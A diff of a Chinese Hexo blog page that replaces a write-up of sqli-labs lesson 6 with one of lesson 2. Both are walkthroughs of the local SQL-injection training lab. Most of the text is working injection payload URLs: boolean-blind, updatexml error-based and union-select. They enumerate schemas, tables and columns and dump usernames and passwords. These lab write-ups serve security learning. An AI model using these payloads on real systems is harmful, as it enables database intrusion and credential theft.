@@ -6,17 +6,13 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>sqlilab-lesson6 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="sqlilab lesson6sqlilab lesson6 操作（与第五关类似，不同点在于1后为“）1、通过id&#x3D;1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）2、用left函数判断库名；http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and left((dat">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sqlilab-lesson6">
-<meta property="og:url" content="http://example.com/2022/01/22/sqlilab-lesson6/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sqlilab lesson6sqlilab lesson6 操作（与第五关类似，不同点在于1后为“）1、通过id&#x3D;1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）2、用left函数判断库名；http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and left((dat">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-01-22T03:26:38.000Z">
-<meta property="article:modified_time" content="2022-02-10T03:41:17.453Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -165,60 +161,47 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-sqlilab-lesson6" class="article article-type-post " itemscope itemprop="blogPost">
+  
+    <article id="post-sqlilab-lesson2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 class="article-title" itemprop="name">
-      sqlilab-lesson6
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/29/sqlilab-lesson2/">My New Post</a>
     </h1>
   
 
         
-        <a href="/2022/01/22/sqlilab-lesson6/" class="archive-article-date">
-  	<time datetime="2022-01-22T03:26:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-22</time>
+        <a href="/2021/11/29/sqlilab-lesson2/" class="archive-article-date">
+  	<time datetime="2021-11-29T12:43:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="sqlilab-lesson6"><a href="#sqlilab-lesson6" class="headerlink" title="sqlilab lesson6"></a>sqlilab lesson6</h1><h2 id="sqlilab-lesson6-操作（与第五关类似，不同点在于1后为“）"><a href="#sqlilab-lesson6-操作（与第五关类似，不同点在于1后为“）" class="headerlink" title="sqlilab lesson6 操作（与第五关类似，不同点在于1后为“）"></a>sqlilab lesson6 操作（与第五关类似，不同点在于1后为“）</h2><h3 id="1、通过id-1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union-select联合查询）"><a href="#1、通过id-1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union-select联合查询）" class="headerlink" title="1、通过id=1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）"></a>1、通过id=1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）</h3><h3 id="2、用left函数判断库名；http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-1-’s’–-判断第一位"><a href="#2、用left函数判断库名；http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-1-’s’–-判断第一位" class="headerlink" title="2、用left函数判断库名；http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and left((database()),1)=’s’–+判断第一位"></a>2、用left函数判断库名；<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and left((database()),1)=’s’–+判断第一位</h3><h3 id="3、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-2-’se’–-判断第二位"><a href="#3、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-2-’se’–-判断第二位" class="headerlink" title="3、http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and left((database()),2)=’se’–+判断第二位"></a>3、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and left((database()),2)=’se’–+判断第二位</h3><h3 id="4、以此类推判断出库名（也可以通过burp-suit等软件速度更快；或者用http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-database-1-1-gt-110–-修改110找到对应的ascii找出库名。）"><a href="#4、以此类推判断出库名（也可以通过burp-suit等软件速度更快；或者用http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-database-1-1-gt-110–-修改110找到对应的ascii找出库名。）" class="headerlink" title="4、以此类推判断出库名（也可以通过burp suit等软件速度更快；或者用http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and ascii(substr((select database()),1,1))&gt;110–+修改110找到对应的ascii找出库名。）"></a>4、以此类推判断出库名（也可以通过burp suit等软件速度更快；或者用<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;110–+修改110找到对应的ascii找出库名。）</h3><h2 id="手动注入流程"><a href="#手动注入流程" class="headerlink" title="手动注入流程"></a>手动注入流程</h2><h3 id="1、通过id-1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union-select联合查询）-1"><a href="#1、通过id-1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union-select联合查询）-1" class="headerlink" title="1、通过id=1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）"></a>1、通过id=1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）</h3><h3 id="2、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-schema-name-from-information-schema-schemata-limit-1-1-1-1-gt-98–-查找出所有库信息"><a href="#2、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-schema-name-from-information-schema-schemata-limit-1-1-1-1-gt-98–-查找出所有库信息" class="headerlink" title="2、http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;98–+查找出所有库信息"></a>2、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;98–+查找出所有库信息</h3><h3 id="3、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-’security’-limit-1-1-1-1-gt-111–-查找所有表信息"><a href="#3、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-’security’-limit-1-1-1-1-gt-111–-查找所有表信息" class="headerlink" title="3、http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema =’security’ limit 1,1),1,1))&gt;111–+查找所有表信息"></a>3、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and ascii(substr((select table_name from information_schema.tables where table_schema =’security’ limit 1,1),1,1))&gt;111–+查找所有表信息</h3><h3 id="4、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-1-1-1-1-gt-111–-查找所有列信息"><a href="#4、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-1-1-1-1-gt-111–-查找所有列信息" class="headerlink" title="4、http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name =’users’ limit 1,1),1,1))&gt;111–+查找所有列信息"></a>4、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name =’users’ limit 1,1),1,1))&gt;111–+查找所有列信息</h3><h3 id="5、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-‘users’-from-security-users-limit-1-1-1-1-gt-111–-最后查找出字段中的值。"><a href="#5、http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-‘users’-from-security-users-limit-1-1-1-1-gt-111–-最后查找出字段中的值。" class="headerlink" title="5、http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39; and ascii(substr((select ‘users’ from security.users limit 1,1),1,1))&gt;111–+最后查找出字段中的值。"></a>5、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-6/?id=1&#39;</a> and ascii(substr((select ‘users’ from security.users limit 1,1),1,1))&gt;111–+最后查找出字段中的值。</h3><h2 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h2><h3 id="1、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-database-0x7e-1-–"><a href="#1、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-database-0x7e-1-–" class="headerlink" title="1、http://127.0.0.1/sqli/Less-6/?id=1&quot; union select updatexml(1,concat(0x7e,(database()),0x7e),1) –+"></a>1、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-6/?id=1&quot;">http://127.0.0.1/sqli/Less-6/?id=1&quot;</a> union select updatexml(1,concat(0x7e,(database()),0x7e),1) –+</h3><h3 id="2、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-table-schema-’security’-limit-0-1-0x7e-1-–"><a href="#2、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-table-schema-’security’-limit-0-1-0x7e-1-–" class="headerlink" title="2、http://127.0.0.1/sqli/Less-6/?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1) –+"></a>2、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-6/?id=1&quot;">http://127.0.0.1/sqli/Less-6/?id=1&quot;</a> union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1) –+</h3><h3 id="3、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-0x7e-1-–"><a href="#3、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-0x7e-1-–" class="headerlink" title="3、http://127.0.0.1/sqli/Less-6/?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’ ),0x7e),1) –+"></a>3、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-6/?id=1&quot;">http://127.0.0.1/sqli/Less-6/?id=1&quot;</a> union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’ ),0x7e),1) –+</h3><h3 id="4、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-username-from-users-0x7e-1-–"><a href="#4、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-username-from-users-0x7e-1-–" class="headerlink" title="4、http://127.0.0.1/sqli/Less-6/?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+"></a>4、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-6/?id=1&quot;">http://127.0.0.1/sqli/Less-6/?id=1&quot;</a> union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+</h3><h3 id="5、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-password-from-users-0x7e-1-–"><a href="#5、http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-password-from-users-0x7e-1-–" class="headerlink" title="5、http://127.0.0.1/sqli/Less-6/?id=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+"></a>5、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-6/?id=1&quot;">http://127.0.0.1/sqli/Less-6/?id=1&quot;</a> union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+</h3>
-      
+        <h1 id="sqlilab-lesson2"><a href="#sqlilab-lesson2" class="headerlink" title="sqlilab lesson2"></a>sqlilab lesson2</h1><h2 id="less-2：（步骤）"><a href="#less-2：（步骤）" class="headerlink" title="less-2：（步骤）"></a>less-2：（步骤）</h2><h3 id="1、判断是否可注入以及注入类型"><a href="#1、判断是否可注入以及注入类型" class="headerlink" title="1、判断是否可注入以及注入类型"></a>1、判断是否可注入以及注入类型</h3><p>数字型注入（补充）</p>
+<ol>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84&quot;%E5%8D%95%E5%BC%95%E5%8F%B7&quot;%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF">http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误</a></p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=1时，没有报错</p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=2时，由于1=2不成立，也会报错</p>
+</li>
+</ol>
+<p>满足这三个，基本上就是数字注入了否则则为字符型</p>
+<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> order by 3–+</p>
+<h3 id="3、判断哪些可回显"><a href="#3、判断哪些可回显" class="headerlink" title="3、判断哪些可回显"></a>3、判断哪些可回显</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> union select 1,2,3–+</p>
+<h3 id="4、查看数据库"><a href="#4、查看数据库" class="headerlink" title="4、查看数据库"></a>4、查看数据库</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<h3 id="5、查看此库中的所有表"><a href="#5、查看此库中的所有表" class="headerlink" title="5、查看此库中的所有表"></a>5、查看此库中的所有表</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<h3 id="6、查看users中的列信息"><a href="#6、查看users中的列信息" class="headerlink" title="6、查看users中的列信息"></a>6、查看users中的列信息</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<h3 id="7、查看所有字段"><a href="#7、查看所有字段" class="headerlink" title="7、查看所有字段"></a>7、查看所有字段</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users–+</p>
+<p>与练习一类似，不同点在于注入类型的判断</p>
 
       
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/wexin2.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/zhifubao.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
+
       
     </div>
     <div class="article-info article-info-index">
@@ -227,84 +210,16 @@
       
 
       
-
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/11/29/sqlilab-lesson2/">展开全文 >></a>
+        </p>
       
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
 
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://tl-memorable.github.io/022/01/22/sqlilab-lesson6/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2022/01/22/sqlilab-lesson7/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sqlilab-lesson7
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2022/01/14/sqlilab-lesson5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sqlilab-lesson5</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -319,32 +234,92 @@
         </div>
         
         
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-lesson6"><span class="toc-number">1.</span> <span class="toc-text">sqlilab lesson6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlilab-lesson6-%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%8E%E7%AC%AC%E4%BA%94%E5%85%B3%E7%B1%BB%E4%BC%BC%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%82%B9%E5%9C%A8%E4%BA%8E1%E5%90%8E%E4%B8%BA%E2%80%9C%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">sqlilab lesson6 操作（与第五关类似，不同点在于1后为“）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%80%9A%E8%BF%87id-1%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E3%80%82%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%89%8D%E5%9B%9B%E5%85%B3%E4%B8%8D%E5%90%8C%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E3%80%82%EF%BC%88%E6%AD%A4%E7%B1%BB%E4%B8%BAbool%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%8D%E5%8F%AF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1、通过id&#x3D;1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%94%A8left%E5%87%BD%E6%95%B0%E5%88%A4%E6%96%AD%E5%BA%93%E5%90%8D%EF%BC%9Bhttp-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-1-%E2%80%99s%E2%80%99%E2%80%93-%E5%88%A4%E6%96%AD%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">1.1.2.</span> <span class="toc-text">2、用left函数判断库名；http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and left((database()),1)&#x3D;’s’–+判断第一位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-left-database-2-%E2%80%99se%E2%80%99%E2%80%93-%E5%88%A4%E6%96%AD%E7%AC%AC%E4%BA%8C%E4%BD%8D"><span class="toc-number">1.1.3.</span> <span class="toc-text">3、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and left((database()),2)&#x3D;’se’–+判断第二位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E4%BB%A5%E6%AD%A4%E7%B1%BB%E6%8E%A8%E5%88%A4%E6%96%AD%E5%87%BA%E5%BA%93%E5%90%8D%EF%BC%88%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87burp-suit%E7%AD%89%E8%BD%AF%E4%BB%B6%E9%80%9F%E5%BA%A6%E6%9B%B4%E5%BF%AB%EF%BC%9B%E6%88%96%E8%80%85%E7%94%A8http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-database-1-1-gt-110%E2%80%93-%E4%BF%AE%E6%94%B9110%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84ascii%E6%89%BE%E5%87%BA%E5%BA%93%E5%90%8D%E3%80%82%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">4、以此类推判断出库名（也可以通过burp suit等软件速度更快；或者用http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and ascii(substr((select database()),1,1))&gt;110–+修改110找到对应的ascii找出库名。）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">手动注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%80%9A%E8%BF%87id-1%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E3%80%82%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%89%8D%E5%9B%9B%E5%85%B3%E4%B8%8D%E5%90%8C%E4%B8%8D%E6%98%BE%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E3%80%82%EF%BC%88%E6%AD%A4%E7%B1%BB%E4%B8%BAbool%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%8D%E5%8F%AF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%89-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、通过id&#x3D;1判断是否可注入以及注入类型。发现与前四关不同不显示用户信息。（此类为bool型注入，不可用union select联合查询）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-schema-name-from-information-schema-schemata-limit-1-1-1-1-gt-98%E2%80%93-%E6%9F%A5%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;98–+查找出所有库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-%E2%80%99security%E2%80%99-limit-1-1-1-1-gt-111%E2%80%93-%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D;’security’ limit 1,1),1,1))&gt;111–+查找所有表信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-%E2%80%99users%E2%80%99-limit-1-1-1-1-gt-111%E2%80%93-%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%88%97%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and ascii(substr((select column_name from information_schema.columns where table_name &#x3D;’users’ limit 1,1),1,1))&gt;111–+查找所有列信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81http-127-0-0-1-sqli-labs-master-Less-6-id-1-39-and-ascii-substr-select-%E2%80%98users%E2%80%99-from-security-users-limit-1-1-1-1-gt-111%E2%80%93-%E6%9C%80%E5%90%8E%E6%9F%A5%E6%89%BE%E5%87%BA%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1&#39; and ascii(substr((select ‘users’ from security.users limit 1,1),1,1))&gt;111–+最后查找出字段中的值。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">updatexml()报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-database-0x7e-1-%E2%80%93"><span class="toc-number">1.3.1.</span> <span 